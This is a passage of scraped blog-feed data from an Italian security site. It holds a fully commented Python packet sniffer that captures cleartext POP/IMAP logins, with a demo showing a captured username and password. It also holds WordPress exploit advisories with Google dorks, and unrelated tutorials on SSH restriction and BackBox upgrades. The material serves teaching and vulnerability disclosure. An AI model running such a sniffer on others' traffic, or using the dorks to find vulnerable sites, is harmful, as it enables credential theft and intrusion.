spaventate per la lunghezza del codice, la maggior parte delle righe sono commenti.\nRequisiti   Interprete Python 2.7.x ( versione su cui ho fatto i test, ma anche la 2.6.x non dovrebbe aver problemi)\n  Conoscenze minime di Python\n  Conoscenze minime dei protocolli, in particolare Internet Protocol\n  Account privilegiato (Administrator/root) di sistema per eseguire lo script\n  Codice # Python POP/IMAP Sniffer by Claudio Viviani\r#\r# http://www.homelab.it\r# info@homelab.it\r# homelabit@protonmail.ch\r#\r# https://www.facebook.com/homelabit\r# https://twitter.com/homelabit\r# https://plus.google.com/+HomelabIt1/\r# https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r#\r#\r# Moduli - 0x1 - Questo modulo gestisce i socket di sistema\r# http://docs.python.it/html/lib/module-socket.html\rimport socket\r# Moduli - 0x2 - Questo modulo gestisce prametri e funzioni specifiche per il sistema\r# http://docs.python.it/html/lib/module-sys.html\rimport sys\r# Moduli - 0x3 - Questo modulo effettua conversioni tra i valori Python e le strutture C rappresentate come stringhe Python.\r# Puo\u0026#39; venire impiegato per gestire dati binari memoprizzati su file o provienienti da una connessione di rete, # come esempio di sorgenti di dati, fra i tanti possibili.\r# http://docs.python.it/html/lib/module-struct.html\rfrom struct import *\rbanner=\u0026#39;\u0026#39;\u0026#39;\r#############################\rPython POP/IMAP Sniffer\rby\rClaudio Viviani\r#############################\r\u0026#39;\u0026#39;\u0026#39;\rprint(banner)\r# Creo il socket utilizzando la funzione PF_PACKET e SOCK_RAW per operare al livello di device driver layer,\r# rimanendo in ascolto su tutti i protocolli ETH_P_ALL (0x0003) con l\u0026#39;ordine dei byte da network a host (ntohs)\r# https://it.wikipedia.org/wiki/Ordine_dei_byte\r#\r# E\u0026#39; necessario un account privilegiato (Administrator/root) per creare un un socket raw pf_packet\rtry:\rs = socket.socket( socket.PF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))\r# Creo un ciclo infinito per raccogliere tutti i pacchetti che transitano dal device\rwhile True:\r# Nel socket creo un buffer per memorizzarci il pacchetto\rpacket = s.recvfrom(65565)\r# I pacchetti arrivano come tuple, a noi interessano i dati presenti nella prima tupla [0]\rpacket = packet[0]\r# Phisical Layer - 0x1 - I primi 14 byte di un frame ethernet compongono l\u0026#39;ethernet header e sono suddivisi in 3 parti:\r#\r# 1) Destination MAC Address (6 byte chars)\r# 2) Source MAC Address (6 byte chars)\r# 4) Ether type o Protocollo (2 byte int)\r#\r# Rif: https://it.wikipedia.org/wiki/Frame_Ethernet\r#\r# Lunghezza frame interessata 6+6+2\reth_length = 14\r# Del pacchetto prendo i primi 14 byte (Vedi commento Phisical Layer - 0x1 -)\reth_header = packet[:eth_length]\r# Tramite la funzione unpack del modulo struct formatto i dati del pacchetto ricevuto da binario al formato desiderato.\r# (Per la tabella dei formatti fare riferimento al link nel commento Moduli - 0x3 -)\r# Seguendo la tabella dei formatti, utilizzo i parametri: # 6s (dest macs - stringa di 6 byte)\r# 6s (source mac - stringa di 6 byte)\r# H (ether type - intero di 2 byte) #\r# Utilizzo il simbolo \u0026#34;!\u0026#34; per specificare che l\u0026#39;ordine dei byte del pacchetto binario e\u0026#39; big-endian.\r# I pacchetti di rete utilizzano l\u0026#39;ordine big-endian\r# https://it.wikipedia.org/wiki/Ordine_dei_byte\reth = unpack(\u0026#39;!6s6sH\u0026#39; , eth_header)\r#\r# Tramite la funzione ntohs del modulo socket converto l\u0026#39;ordine dei byte da network ad host\r# estrapolando il protocollo che si trova nella terza tupla (eth[2])\reth_protocol = socket.ntohs(eth[2])\r#\r# Considero solo il protocollo IP che viene classificato col valore intero 8\rif eth_protocol == 8 :\r# Per estrapolare l\u0026#39;ip header del pacchetto, prendo i 20 byte successivi all\u0026#39;ethernet,quindi da 14 al 34\rip_header = packet[eth_length:20+eth_length]\r# Tramite la funzione unpack del modulo struct formatto i dati del pacchetto ricevuto da binario al formato desiderato.\r# (Per la tabella dei formatti fare riferimento al link nel commento Moduli - 0x3 -)\riph = unpack(\u0026#39;!BBHHHBBH4s4s\u0026#39; , ip_header)\r# Per estrapolare dal pacchetto il valore di lunghezza dell\u0026#39;ip header devo:\r# 1) Selezionare la prima tupla di 1 byte (8bit) dove trovero\u0026#39; i valori dell\u0026#39;ip version(4 bit)+header length(4bit)\r# https://it.wikipedia.org/wiki/IPv4\rversion_ihl = iph[0]\r# 2) Tramite gli operatori bitwise, in particolare con l\u0026#39;opratore AND (\u0026amp;), # estrapolo gli ultimi 4 bit(0xF = 1111) dove e\u0026#39; presente il campo header length\r# http://docs.python.it/html/ref/bitwise.html\riph_length = version_ihl \u0026amp; 0xF\r# 3) Moltiplico la lunghezza per 4 per avere il valore in byte\riph_length = iph_length * 4\r# Per estrapolare il protocollo dal pacchetto, seleziona la quinta tupla\rprotocol = iph[6]\r# Per selezionare il source e destination address seleziono la settima e ottava tupla convertendola nella rappresentazione # standard in quartine-puntate tramite la funzione inet_ntoa del modulo socket.\rs_addr = socket.inet_ntoa(iph[8]);\rd_addr = socket.inet_ntoa(iph[9]);\r# Considero solo il protocollo TCP che viene classificato col valore intero 6\rif protocol == 6 :\r# Per estrapolare il tcp header del pacchetto, prendo i 20 byte successivi all\u0026#39;ip header,quindi da 34 al 54\rtcp_header = packet[34:54]\r# Tramite la funzione unpack del modulo struct formatto i dati del pacchetto ricevuto da binario al formato desiderato.\r# (Per la tabella dei formatti fare riferimento al link nel commento Moduli - 0x3 -)\rtcph = unpack(\u0026#39;!HHLLBBHHH\u0026#39; , tcp_header)\r# Per estrapolare la source eport dal pacchetto, seleziono la prima tupla source_port = tcph[0]\r# Per estrapolare la destination port dal pacchetto, seleziono la seconda tupla\rdest_port = tcph[1]\r# Per estrapolare il sequence number dal pacchetto, seleziono la terza tupla\rsequence = tcph[2]\r# Per estrapolare l\u0026#39;acknowledgement number dal pacchetto, seleziono la quarta tupla\racknowledgement = tcph[3]\r# Per estrapolare dal pacchetto il valore di lunghezza del tcp header devo:\r# 1) Selezionare la quinta tupla di 1 byte (8bit) dove trovero\u0026#39; i valori del Data offset(4 bit)+reserved(4bit)\r# https://it.wikipedia.org/wiki/Transmission_Control_Protocol\rdoff_reserved = tcph[4]\r# 2) Tramite gli operatori bitwise, in particolare l\u0026#39;operatore shift (\u0026gt;\u0026gt;),\r# estrapolo i primi 4 bit dove e\u0026#39; presente il campo data offset\rtcph_length = doff_reserved \u0026gt;\u0026gt; 4\r# Moltiplico la lunghezza per 4 per avere il valore in byte\rtcph_length = tcph_length * 4\r# Calcolo l\u0026#39;inizio dei dati del pacchetto sommando i byte dell\u0026#39;ethernet, ip e tcp lenght\rh_size = eth_length + iph_length + tcph_length\rdata = packet[h_size:]\r# Intercetto solo la source port e destination port pop3/imap (110/143 tcp ports)\rif dest_port == 110 or source_port == 110 or dest_port == 143 or source_port == 143: # Se i dati non sono vuoti li stampo a video\rif data != \u0026#34;\u0026#34;:\rprint \u0026#39;Source IP : \u0026#39; +str(s_addr)\rprint \u0026#39;Source Port : \u0026#39; +str(source_port)\rprint \u0026#39;Dest IP : \u0026#39; +str(d_addr)\rprint \u0026#39;Dest Port : \u0026#39; +str(dest_port)\rprint \u0026#39;Sequence Number : \u0026#39; + str(sequence) + \u0026#39; Acknowledgement : \u0026#39; + str(acknowledgement)\rprint \u0026#39;Data : \u0026#39; + data\rexcept socket.error , msg:\rprint \u0026#39;Errore nella creazione del socket: %s\u0026#39; %msg[1]\rsys.exit()\rexcept KeyboardInterrupt:\rprint \u0026#34;Sniffer interrotto dall\u0026#39;utente \u0026#34;\rsys.exit() Test sniffer Eseguire lo sniffer con i permessi di root:\nclaudio@backbox:~/home/claudio$ sudo python sniffer.py Emulare una connessione pop3 tramite telnet:\nclaudio@backbox:~$ telnet 192.168.0.10 110\rTrying 192.168.0.10...\rConnected to 192.168.0.10.\rEscape character is \u0026#39;^\\]\u0026#39;.\r+OK Dovecot ready.\ruser claudio\r+OK\rpass pippo\r+OK Logged in.\rquit\r+OK Logging out.\rConnection closed by foreign host.\rclaudio@backbox:~$ Controllare l’output dello sniffer:\n#############################\rPython POP/IMAP Sniffer\rby\rClaudio Viviani\r#############################\rSource IP : 192.168.0.10\rSource Port : 110\rDest IP : 192.168.0.5\rDest Port : 34742\rSequence Number : 4138504174 Acknowledgement : 3055068377\rData : +OK Dovecot ready.\rSource IP : 192.168.0.5\rSource Port : 34742\rDest IP : 192.168.0.10\rDest Port : 110\rSequence Number : 3055068377 Acknowledgement : 4138504194\rData : user claudio\rSource IP : 192.168.0.10\rSource Port : 110\rDest IP : 192.168.0.5\rDest Port : 34742\rSequence Number : 4138504194 Acknowledgement : 3055068390\rData : +OK\rSource IP : 192.168.0.5\rSource Port : 34742\rDest IP : 192.168.0.10\rDest Port : 110\rSequence Number : 3055068390 Acknowledgement : 4138504199\rData : pass pippo\rSource IP : 192.168.0.10\rSource Port : 110\rDest IP : 192.168.0.5\rDest Port : 34742\rSequence Number : 4138504199 Acknowledgement : 3055068405\rData : +OK Logged in.\rSource IP : 192.168.0.5\rSource Port : 34742\rDest IP : 192.168.0.10\rDest Port : 110\rSequence Number : 3055068405 Acknowledgement : 4138504215\rData : quit\rSource IP : 192.168.0.10\rSource Port : 110\rDest IP : 192.168.0.5\rDest Port : 34742\rSequence Number : 4138504215 Acknowledgement : 3055068411\rData : +OK Logging out. Conclusioni Come avete notato lo script è semplice da comprendere e modificare, può essere una buona base di partenza per la creazione di uno sniffer più raffinato; Per esempio potrebbe essere utile salvare i dati intercettati all’interno di un file log:\n# Se i dati non sono vuoti li stampo a video e loggo in un file\rif data != \u0026#34;\u0026#34;:\rprint \u0026#39;Source IP : \u0026#39; +str(s_addr)\rprint \u0026#39;Source Port : \u0026#39; +str(source_port)\rprint \u0026#39;Dest IP : \u0026#39; +str(d_addr)\rprint \u0026#39;Dest Port : \u0026#39; +str(dest_port)\rprint \u0026#39;Sequence Number : \u0026#39; + str(sequence) + \u0026#39; Acknowledgement(acknowledgement)\rprint \u0026#39;Data : \u0026#39; + data\r# Se i dati non sono vuoti li loggo aggiungendo le righe al file\rlog = open(\u0026#39;log.txt\u0026#39;,\u0026#39;a\u0026#39;)\rlog.write(\u0026#39;\\nSource IP : \u0026#39; +str(s_addr))\rlog.write(\u0026#39;\\nSource Port : \u0026#39; +str(source_port))\rlog.write(\u0026#39;\\nDest IP : \u0026#39; +str(d_addr))\rlog.write(\u0026#39;\\nDest Port : \u0026#39; +str(dest_port))\rlog.write(\u0026#39;\\nSequence Number : \u0026#39; + str(sequence) + \u0026#39; Acknowledgement(acknowledgement))\rlog.write(\u0026#39;\\nData : \u0026#39; + data) Per info o delucidazioni non esistate a contattarmi o a commentare il post!\nReferenze http://www.binarytides.com/python-packet-sniffer-code-linux/\n","permalink":"https://www.homelab.it/index.php/2015/08/16/come-creare-uno-sniffer-di-rete-in-python/","summary":"Se anche voi siete appassionati di penetration testing, vi potrà tornare utile creare dei tools personalizzati da utilizzare durante le tue analisi.\nPython è un fantastico e potente linguaggio di programmazione che mette a disposizione tantissime librerie che possono fare al case nostro, con il vantaggio di essere di facile comprensione.\nQui di seguito troverete il codice sorgente, commentato in maniera dettagliata, di uno sniffer di rete principalmente dedicato alla cattura del traffico POP/IMAP.","title":"Come creare uno sniffer di rete in Python"},{"content":"######################\r# Exploit Title : WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS\r# Exploit Author : Claudio Viviani\r# Website Author: http://www.homelab.it\rhttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)\r# Vendor Homepage : https://wordpress.org/plugins/wp-fast-cache/\r# Software Link : https://downloads.wordpress.org/plugin/wp-fast-cache.1.4.zip\r# Dork Google: index of wp-fast-cache\r# Date : 2015-05-11\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# Info\rWP Fast Cache is vulnerable to CSRF attacks, which can also be combined with stored/reflected XSS attacks (authenticated administrators only). \u0026mdash;\u0026ndash; DOWNLAOD EXPLOIT HERE \u0026mdash;\u0026ndash;\n","permalink":"https://www.homelab.it/index.php/2015/05/27/wp-fast-cache-csrf-xss/","summary":"######################\r# Exploit Title : WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS\r# Exploit Author : Claudio Viviani\r# Website Author: http://www.homelab.it\rhttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)\r# Vendor Homepage : https://wordpress.org/plugins/wp-fast-cache/\r# Software Link : https://downloads.wordpress.org/plugin/wp-fast-cache.1.4.zip\r# Dork Google: index of wp-fast-cache\r# Date : 2015-05-11\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# Info\rWP Fast Cache is vulnerable to CSRF attacks, which can also be combined with stored/reflected XSS attacks (authenticated administrators only).","title":"WP Fast Cache 1.4 and below CSRF Stored/Reflected XSS"},{"content":"\n###################### # Exploit Title : WordPress Video Gallery 2.8 Unprotected Mail Page # Exploit Author : Claudio Viviani # Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery # Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip # Dork Google: index of \u0026#34;contus-video-gallery\u0026#34; # Date : 2015-04-05 # Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from Unprotected Mail Page. This vulnerability is exploitable to dos, phishing, mailbombing, spam... The \u0026#34;email\u0026#34; ajax action is callable from any guest visitor (/contus-video-gallery/hdflvvideoshare.php) /** * Email function */ add_action( \u0026#39;wp_ajax_email\u0026#39;, \u0026#39;email_function\u0026#39; ); add_action( \u0026#39;wp_ajax_nopriv_email\u0026#39;, \u0026#39;email_function\u0026#39; ); function email_function() { require_once( dirname( __FILE__ ) . \u0026#39;/email.php\u0026#39; ); die(); } Any user can send email from /contus-video-gallery/email.php to any recipients. The variables used to send emails are: $to = filter_input( INPUT_POST, \u0026#39;to\u0026#39;, FILTER_VALIDATE_EMAIL ); $from = filter_input( INPUT_POST, \u0026#39;from\u0026#39;, FILTER_VALIDATE_EMAIL ); $url = filter_input( INPUT_POST, \u0026#39;url\u0026#39;, FILTER_VALIDATE_URL ); $subject = filter_input( INPUT_POST, \u0026#39;Note\u0026#39;, FILTER_SANITIZE_STRING ); $message_content = filter_input( INPUT_POST, \u0026#39;Note\u0026#39;, FILTER_SANITIZE_STRING ); $title = filter_input( INPUT_POST, \u0026#39;title\u0026#39;, FILTER_SANITIZE_STRING ); $referrer = parse_url( $_SERVER[\u0026#39;HTTP_REFERER\u0026#39;] ); $referrer_host = $referrer[\u0026#39;scheme\u0026#39;] . \u0026#39;://\u0026#39; . $referrer[\u0026#39;host\u0026#39;]; $pageURL = \u0026#39;http\u0026#39;; It assumes that if the provided “Referrer” field fits the website’s URL, then it’s okay to send this email: if ( $referrer_host === $pageURL ) { $headers = \u0026#34;MIME-Version: 1.0\u0026#34; . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;Content-type:text/html;charset=UTF-8\u0026#34; . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;From: \u0026#34; . \u0026#34;\u0026lt;\u0026#34; . $from . \u0026#34;\u0026gt;\\r\\n\u0026#34;; $headers .= \u0026#34;Reply-To: \u0026#34; . $from . \u0026#34;\\r\\n\u0026#34;; $headers .= \u0026#34;Return-path: \u0026#34; . $from; $username = explode(\u0026#39;@\u0026#39; , $from ); $username = ucfirst($username[\u0026#39;0\u0026#39;]); $subject = $username . \u0026#39; has shared a video with you.\u0026#39;; $emailtemplate_path = plugin_dir_url( __FILE__ ).\u0026#39;front/emailtemplate/Emailtemplate.html\u0026#39;; $message = file_get_contents( $emailtemplate_path); $message = str_replace( \u0026#39;{subject}\u0026#39;, $subject, $message ); $message = str_replace( \u0026#39;{message}\u0026#39;, $message_content, $message); $message = str_replace( \u0026#39;{videourl}\u0026#39;,$url,$message ); $message = str_replace(\u0026#39;{username}\u0026#39;,$username ,$message ); if ( @mail( $to, $title, $message, $headers ) ) { echo \u0026#39;success=sent\u0026#39;; } else { echo \u0026#39;success=error\u0026#39;; } } else { echo \u0026#39;success=error\u0026#39;; } The “Referer” field can easily be modified by the attacker! ###################### Discovered By : Claudio Viviani http://www.homelab.it http://ffhd.homelab.it (Free Fuzzy Hashes Database) info@homelab.it homelabit@protonmail.ch https://www.facebook.com/homelabit https://twitter.com/homelabit https://plus.google.com/+HomelabIt1/ https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww ##################### \u0026mdash; DOWNLOAD EXPLOIT HERE \u0026mdash;\n","permalink":"https://www.homelab.it/index.php/2015/05/22/wordpress-video-gallery-2-8-unprotected-mail-page/","summary":"###################### # Exploit Title : WordPress Video Gallery 2.8 Unprotected Mail Page # Exploit Author : Claudio Viviani # Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery # Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.8.zip # Dork Google: index of \u0026#34;contus-video-gallery\u0026#34; # Date : 2015-04-05 # Tested on : Linux / Mozilla Firefox ###################### # Description Wordpress Video Gallery 2.8 suffers from Unprotected Mail Page. This vulnerability is exploitable to dos, phishing, mailbombing, spam... The \u0026#34;email\u0026#34; ajax action is callable from any guest visitor (/contus-video-gallery/hdflvvideoshare.","title":"WordPress Video Gallery 2.8 Unprotected Mail Page"},{"content":"Oggi ho avuto l’immenso piacere di leggere che è uscita la release 4.2 della distribuzione BackBox 4.2 made in italy orientata al penetration testing!\nOltre al sito ufficiale, l’annuncio è stato rilasciato sul sito (OverSecurity) di uno dei membri del BackBox Team: Andrea Draghetti\nLe novità più importanti sono le seguenti:\nChangelog  Preinstalled Linux Kernel 3.16 New Ubuntu 14.04.2 base Ruby 2.1 Installer with LVM and Full Disk Encryption options Handy Thunar custom actions RAM wipe at shutdown/reboot System improvements Upstream components Bug corrections Performance boost Improved Anonymous mode Predisposition to ARM architecture (armhf Debian packages) Predisposition to BackBox Cloud platform New and updated hacking tools: beef-project, crunch, fang, galleta, jd-gui, metasploit-framework, pasco, pyew, rifiuti2, setoolkit, theharvester, tor, torsocks, volatility, weevely, whatweb, wpscan, xmount, yara, zaproxy  Upgrade Andrea, oltre a riferire le ultime modifiche, ha rilasciato una mini-guida per aggiornare BackBox dalla versione 4.0 alla versione 4.2 senza dover reinstallare la distribuzione da zero:\n $ sudo apt-get update $ sudo apt-get dist-upgrade $ sudo apt-get install -f $ sudo apt-get install linux-image-generic-lts-utopic linux-headers-generic-lts-utopic linux-signed-image-generic-lts-utopic $ sudo apt-get purge ri1.9.1 ruby1.9.1 ruby1.9.3 bundler $ sudo gem cleanup $ sudo rm -rf /var/lib/gems/1.* $ sudo apt-get install backbox-default-settings backbox-desktop --reinstall $ sudo apt-get install backbox-tools --reinstall $ sudo apt-get install beef-project metasploit-framework whatweb wpscan --reinstall $ sudo apt-get autoremove --purge Download Per scaricare l’iso completa della distribuzione potete far riferimento al seguente url:\nhttp://backbox.org/downloads\nNaturalmente se potete non mancate di supportare il progetto con una piccola donazione!\n","permalink":"https://www.homelab.it/index.php/2015/04/27/backbox-4-2-is-out-ecco-come-aggiornare-la-release/","summary":"Oggi ho avuto l’immenso piacere di leggere che è uscita la release 4.2 della distribuzione BackBox 4.2 made in italy orientata al penetration testing!\nOltre al sito ufficiale, l’annuncio è stato rilasciato sul sito (OverSecurity) di uno dei membri del BackBox Team: Andrea Draghetti\nLe novità più importanti sono le seguenti:\nChangelog  Preinstalled Linux Kernel 3.16 New Ubuntu 14.04.2 base Ruby 2.1 Installer with LVM and Full Disk Encryption options Handy Thunar custom actions RAM wipe at shutdown/reboot System improvements Upstream components Bug corrections Performance boost Improved Anonymous mode Predisposition to ARM architecture (armhf Debian packages) Predisposition to BackBox Cloud platform New and updated hacking tools: beef-project, crunch, fang, galleta, jd-gui, metasploit-framework, pasco, pyew, rifiuti2, setoolkit, theharvester, tor, torsocks, volatility, weevely, whatweb, wpscan, xmount, yara, zaproxy  Upgrade Andrea, oltre a riferire le ultime modifiche, ha rilasciato una mini-guida per aggiornare BackBox dalla versione 4.","title":"BackBox 4.2 is out! Ecco come aggiornare la release…"},{"content":"Introduzione Oggi mi sono trovato nella necessità di dover utilizzare un utente, tramite protocollo ssh, per eseguire un singolo e semplice comando da remoto verso un server linux.\nPer ragioni di sicurezza mi sono chiesto se esistesse la possibilità di limitare tale utenza all’esecuzione di un unico programma, senza ricorrere a jail (chroot) o shell “castrate” di terze parti.\nGoogolando e leggendo il man di ssh ho scoperto una soluzione facile e carina:\nAUTHORIZED_KEYS FILE FORMAT AuthorizedKeysFile specifies the file containing public keys for public key authentication; if none is specified, the default is ~/.ssh/authorized_keys. Each line of the file contains one key (empty (because of the size of the public key encoding) up to a limit of 8 kilo- bytes, which permits DSA keys up to 8 kilobits and RSA keys up to 16 kilobits. You don\u0026#39;t want to type them in; instead, copy the identity.pub, id_dsa.pub, or the id_rsa.pub file and edit it. ... ... ... command=\u0026#34;command\u0026#34; Specifies that the command is executed whenever this key is used for authentication. The command supplied by the user (if any) is ignored. The command is run on a pty if the client requests a pty; otherwise it is run without a tty. If an 8-bit clean chan- nel is required, one must not request a pty or should specify no-pty. A quote may be included in the command by quoting it with a backslash. This option might be useful to restrict cer- tain public keys to perform just a specific operation. An exam- ple might be a key that permits remote backups but nothing else. Note that the client may specify TCP and/or X11 forwarding unless they are explicitly prohibited. The command originally supplied by the client is available in the SSH_ORIGINAL_COMMAND environ- ment variable. Note that this option applies to shell, command or subsystem execution. In poche parole autenticando gli utenti remoti in ssh tramite lo scambio delle chiavi pubbliche, quindi senza utilizzare alcuna password, è possibile specificare l’unico programma che l’utente potrà eseguire.\nChiave Privata e Pubblica Per permettere ad un client di collegarsi su un server remoto ssh tramite lo scambio delle chiavi, sono necessarie due azioni:\n Generazione delle chiave privata e pubblica per l’utente (ad esempio pippo) che utilizzerà il client. Copia della chiave pubblica sul server nella home directory di pippo  Generazione delle chiavi Per generare le chiavi basta eseguire lato client il seguente comando:\n[pippo@client ~]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/pippo/.ssh/id_rsa): (Premi invio) Created directory \u0026#39;/home/pippo/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): (Premi invio) Enter same passphrase again: (Premi invio) Your identification has been saved in /home/pippo/.ssh/id_rsa. Your public key has been saved in /home/pippo/.ssh/id_rsa.pub. The key fingerprint is: f3:3b:e4:2d:e9:d2:1d:b3:93:70:45:cc:58:36:0c:96 pippo@client.localdomain [pippo@client ~]$ Come si può notare la chiave privata (id_rsa) e quella pubblica (id_rsa.pub) vengono create nella cartella .ssh all’interno della home utente.\nCopia della chiave pubblica sul server Per copiare la chiave si possono utilizzare svariati metodi, qui di seguito riporto i due più classici:\n1) [pippo@client ~]$ ssh-copy-id pippo@server pippo@server\u0026#39;s password: (Inserisci la password) Now try logging into the machine, with \u0026#34;ssh \u0026#39;pippo@server\u0026#39;\u0026#34;, and check in: .ssh/authorized_keys to make sure we haven\u0026#39;t added extra keys that you weren\u0026#39;t expecting. 2) In alternativa si può utilizzare il classico “scp“, ma prima è necessario eseguire un paio di comandi lato server:\n[pippo@server ~\\]$ mkdir ~/.ssh [pippo@server ~\\]$ chmod 700 ~/.ssh/ A questo punto copiare la chiave sul server ed inserire le credenziali richieste:\n[pippo@client ~\\]$ scp ~/.ssh/id_rsa.pub server:/home/pippo/.ssh/authorized_keys Infine sistemare i permessi del file appena caricato sul server:\n[pippo@server ~\\]$ chmod 600 ~/.ssh/authorized_keys Limitazione utente Come anticipato nello spezzone di “man” copiato all’inizio del post, per limitare gli utenti ssh ad un singolo comando è necessario modificare lato server il file authorized_keys.\nPonendo il caso di voler fare eseguire solo il comandi “id” all’utente pippo, il file authorized_keys deve essere modificato da così:\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA....E96KU2aGiF7BuNe3vQ== pippo@client.localdomain a così:\ncommand=\u0026#34;id\u0026#34; ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA....E96KU2aGiF7BuNe3vQ== pippo@client.localdomain In pratica basta aggiungere all’inizio della riga l’opzione command=”” mettendo tra virgolette il comando interessato.\nE’ possibile testare il comando lato client eseguendo il comando:\n[pippo@client ~]$ ssh pippo@server uid=522(pippo) gid=522(pippo) gruppi=522(pippo) Connection to server closed. Controllando l’output si nota che il server ssh dopo aver eseguito il comando id, senza aver richiesto la password, chiude la connessione al client.\nNaturalmente qui si apre un mondo, ad esempio è possibile sostituire il singolo comando con uno script, creato sul server, che esegue più programmi.\nSe vogliamo rendere il comando più dinamico, e quindi personalizzare gli argomenti da passare, basta aggiungere la variabile $SSH_ORIGINAL_COMMAND all’opzione command=””:\ncommand=\u0026#34;id $SSH_ORIGINAL_COMMAND\u0026#34; ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA....E96KU2aGiF7BuNe3vQ== pippo@client.localdomain Esempio:\n[pippo@client ~]$ ssh pippo@server \u0026#34;id --version\u0026#34; id (GNU coreutils) 5.97 Copyright (C) 2006 Free Software Foundation, Inc. This is free software. You may redistribute copies of it under the terms of the GNU General Public License \u0026lt;http://www.gnu.org/licenses/gpl.html\u0026gt;. There is NO WARRANTY, to the extent permitted by law. Written by Arnold Robbins and David MacKenzie. Prima di salutarvi vi consiglio di aggiungere anche queste ulteriori restrizioni all’interno del file authorized_keys:\ncommand=\u0026#34;id $SSH_ORIGINAL_COMMAND\u0026#34;,no-port-forwarding,no-pty,no-agent-forwarding,no-X11-forwarding Con questa modifica l’utente, oltre a non poter eseguire altri comandi, non potrà eseguire i vari forwarding o aprire terminali virtuali.\n","permalink":"https://www.homelab.it/index.php/2015/04/27/come-limitare-gli-utenti-ssh-ad-un-singolo-comando/","summary":"Introduzione Oggi mi sono trovato nella necessità di dover utilizzare un utente, tramite protocollo ssh, per eseguire un singolo e semplice comando da remoto verso un server linux.\nPer ragioni di sicurezza mi sono chiesto se esistesse la possibilità di limitare tale utenza all’esecuzione di un unico programma, senza ricorrere a jail (chroot) o shell “castrate” di terze parti.\nGoogolando e leggendo il man di ssh ho scoperto una soluzione facile e carina:","title":"Come limitare gli utenti ssh ad un singolo comando"},{"content":"VMware ha rilasciato un eBook gratuito intitolato “Virtualization 2.0 for Dummies” scritto da Hanish Rathod e Josh Townsend.\nDOWNLOAD\n","permalink":"https://www.homelab.it/index.php/2015/04/24/virtualization-2-0-for-dummies-free-ebook/","summary":"VMware ha rilasciato un eBook gratuito intitolato “Virtualization 2.0 for Dummies” scritto da Hanish Rathod e Josh Townsend.\nDOWNLOAD","title":"Virtualization 2.0 for Dummies (Free eBook) Download"},{"content":"######################\r# Exploit Title : WordPress NEX-Forms 3.0 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Website Author: http://www.homelab.it\rhttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)\r# Vendor Homepage : https://wordpress.org/plugins/nex-forms-express-wp-form-builder/\r# Software Link : https://downloads.wordpress.org/plugin/nex-forms-express-wp-form-builder.3.0.zip\r# Dork Google: inurl:nex-forms-express-wp-form-builder\r# index of nex-forms-express-wp-form-builder\r# Date : 2015-03-29\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# Info:\rThe \u0026#34;submit_nex_form\u0026#34; ajax function is affected from SQL Injection vulnerability\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rhttp://ffhd.homelab.it (Free Fuzzy Hashes Database)\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### -\u0026mdash;- DOWNLOAD EXPLOIT HERE \u0026mdash;\u0026ndash;\n  ","permalink":"https://www.homelab.it/index.php/2015/04/21/wordpress-nex-forms-sqli/","summary":"######################\r# Exploit Title : WordPress NEX-Forms 3.0 SQL Injection Vulnerability\r# Exploit Author : Claudio Viviani\r# Website Author: http://www.homelab.it\rhttp://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)\r# Vendor Homepage : https://wordpress.org/plugins/nex-forms-express-wp-form-builder/\r# Software Link : https://downloads.wordpress.org/plugin/nex-forms-express-wp-form-builder.3.0.zip\r# Dork Google: inurl:nex-forms-express-wp-form-builder\r# index of nex-forms-express-wp-form-builder\r# Date : 2015-03-29\r# Tested on : Windows 7 / Mozilla Firefox\r# Linux / Mozilla Firefox\r######################\r# Info:\rThe \u0026#34;submit_nex_form\u0026#34; ajax function is affected from SQL Injection vulnerability\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.","title":"WordPress NEX-Forms 3.0 SQL Injection Vulnerability"},{"content":" Introduzione I ransomware sono i nuovi malware (Malicious Software) che non solo infettano il sistema del malcapitato, ma criptano tutti i dati sensibili presenti sul proprio drive locale, dischi/pendrive collegate e, nello sciagurato caso, anche directory/unità di rete montate.\nUna volta criptati i dati non sono più leggibili, a meno che non si paghi un riscatto (ransom in inglese) seguendo delle precise istruzioni rilasciate dagli sviluppatori del virus.\nCoinVault ransomware CoinVault è un dei moltissimi ransomware che stanno infettando moltissimi utenti chiedendo un riscatto in bitcoin, la famosissima moneta elettronica.\nLa polizia Olandese National High Tech Crime Unit (NHTCU) e il team del Kaspersky Lab hanno unito le forze per contrastare questo tipo di ransomware, il frutto del loro lavoro si chiama “kaspersky-coinvault-decryptor” ovvero un tool che permette (o almeno di prova) di decriptare i files compromessi da CoinVault.\nQuesto tool contiente un database, aggiornato costantemente, contenente le chiavi necessarie alla decriptazione.\nPer tenersi aggiornati sui vari aggiornamenti basta recarsi al seguente indirizzo:\nhttps://noransom.kaspersky.com/\nProcedura per la rimozione e decriptazione La 